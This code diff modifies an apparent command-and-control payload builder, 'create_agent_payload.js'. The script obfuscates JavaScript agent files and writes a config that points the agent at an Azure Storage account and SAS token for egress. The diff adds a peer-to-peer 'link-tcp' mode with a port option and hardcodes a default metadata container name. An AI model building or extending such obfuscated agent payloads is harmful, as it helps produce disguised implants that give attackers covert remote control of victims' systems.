@@ -49,7 +49,7 @@ if (isDebug) {
 // ---------- Help Menu ----------
 if (argMap.h || argMap.help) {
     console.log(`
-Usage: node obfuscateAgent.js [AppName] [--account <StorageAccount>] [--token <SASToken>] [--meta <ContainerName>] [-h|--help] [--debug|-d]
+Usage: node create_agent_payload.js [AppName] [--account <StorageAccount>] [--token <SASToken>] [--meta <ContainerName>] [--tcp <port>] [-h|--help] [--debug|-d]
 
 Arguments:
     AppName              Optional. Used to name the final output in package.json.
@@ -57,12 +57,13 @@ Arguments:
     --account            Azure Storage Account name. Will prompt if not provided.
     --token              Azure SAS Token. Will prompt if not provided.
     --meta               Container name for metadata. If omitted, a random name is generated.
+    --tcp                Optional. TCP port for link mode. If specified, agent will run in link-tcp mode.
     --cleanup            Remove node modules, package.json, and other dependency files after execution.
     -h, --help           Show this help message and exit.
     --debug, -d          Enable verbose output about file operations.
 
 Example:
-    node obfuscateAgent.js MyTool --account myacct --token 'se=2025...' --meta metaX123456 --debug
+    node create_agent_payload.js MyTool --account myacct --token 'se=2025...' --meta metaX123456 --tcp 8080 --debug
 
 This script:
     - Obfuscates JavaScript files in ./agent and writes to ./app
@@ -250,17 +251,23 @@ try {
         }
         const storageAccount = argMap.account || await promptInput("\t- Enter Storage Account  : ");
         const sasToken       = argMap.token   || await promptInput("\t- Enter SAS Token        : ");
-        const metaContainer  = argMap.meta    || generateMetaContainer();
+        const metaContainer  = argMap.meta    || "mzl80liqhujwg";
+        //const metaContainer  = argMap.meta    || generateMetaContainer();
 
         console.log("\n[+] Configuration:");
         console.log("\t- Storage Account :", storageAccount);
         console.log("\t- SAS Token       :", sasToken);
         console.log("\t- Meta Container  :", metaContainer);
 
+        const tcpPort = argMap.tcp ? parseInt(argMap.tcp) : 3000;
+        const mode = argMap.tcp ? 'link-tcp' : 'egress';
+
         const configContent = `module.exports = {
     storageAccount: '${storageAccount}',
     metaContainer: '${metaContainer}',
-    sasToken: '${sasToken}'
+    sasToken: '${sasToken}',
+    p2pPort: ${tcpPort},
+    mode: '${mode}'
 };\n`;
 
         fs.writeFileSync(configSrcPath, configContent, 'utf-8');
